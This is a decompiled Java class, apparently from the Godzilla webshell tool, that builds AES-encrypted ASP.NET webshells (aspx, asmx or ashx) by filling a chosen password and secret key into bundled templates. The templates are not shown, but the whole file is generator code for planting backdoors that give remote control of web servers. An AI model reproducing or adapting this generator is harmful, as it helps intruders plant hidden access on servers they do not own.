/*    */ package shells.cryptions.cshapAes;
/*    */ 
/*    */ import core.ui.component.dialog.GOptionPane;
/*    */ import java.io.InputStream;
/*    */ import util.Log;
/*    */ import util.functions;
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ class Generate
/*    */ {
/* 13 */   private static final String[] SUFFIX = new String[] { "aspx", "asmx", "ashx" };
/*    */   public static byte[] GenerateShellLoder(String shellName, String pass, String secretKey, boolean isBin) {
/* 15 */     byte[] data = null;
/*    */     
/*    */     try {
/* 18 */       InputStream inputStream = Generate.class.getResourceAsStream("template/" + shellName + (isBin ? "raw.bin" : "base64.bin"));
/* 19 */       String code = new String(functions.readInputStream(inputStream));
/* 20 */       inputStream.close();
/* 21 */       code = code.replace("{pass}", pass).replace("{secretKey}", secretKey);
/* 22 */       Object selectedValue = GOptionPane.showInputDialog(null, "suffix", "selected suffix", 1, null, (Object[])SUFFIX, null);
/* 23 */       if (selectedValue != null) {
/* 24 */         String suffix = (String)selectedValue;
/* 25 */         inputStream = Generate.class.getResourceAsStream("template/shell." + suffix);
/* 26 */         String template = new String(functions.readInputStream(inputStream));
/* 27 */         inputStream.close();
/* 28 */         template = template.replace("{code}", code);
/* 29 */         data = template.getBytes();
/*    */       }
/*    */     
/* 32 */     } catch (Exception e) {
/* 33 */       Log.error(e);
/*    */     } 
/* 35 */     return data;
/*    */   }
/*    */   public static byte[] GenerateShellLoder(String pass, String secretKey, boolean isBin) {
/* 38 */     return GenerateShellLoder("", pass, secretKey, isBin);
/*    */   }
/*    */   
/*    */   public static byte[] GenerateShellLoderByAsmx(String shellName, String pass, String secretKey) {
/* 42 */     byte[] data = null;
/*    */     
/*    */     try {
/* 45 */       InputStream inputStream = Generate.class.getResourceAsStream("template/" + shellName + "shellAsmx.asmx");
/* 46 */       String code = new String(functions.readInputStream(inputStream));
/* 47 */       inputStream.close();
/* 48 */       code = code.replace("{pass}", pass).replace("{secretKey}", secretKey);
/* 49 */       return code.getBytes();
/*    */     }
/* 51 */     catch (Exception e) {
/* 52 */       Log.error(e);
/*    */       
/* 54 */       return data;
/*    */     } 
/*    */   } public static byte[] GenerateShellLoderByAsmx(String pass, String secretKey) {
/* 57 */     return GenerateShellLoderByAsmx("", pass, secretKey);
/*    */   }
/*    */ }


/* Location:              C:\User\\user\Downloads\godzilla.jar!\shells\cryptions\cshapAes\Generate.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       1.1.3
 */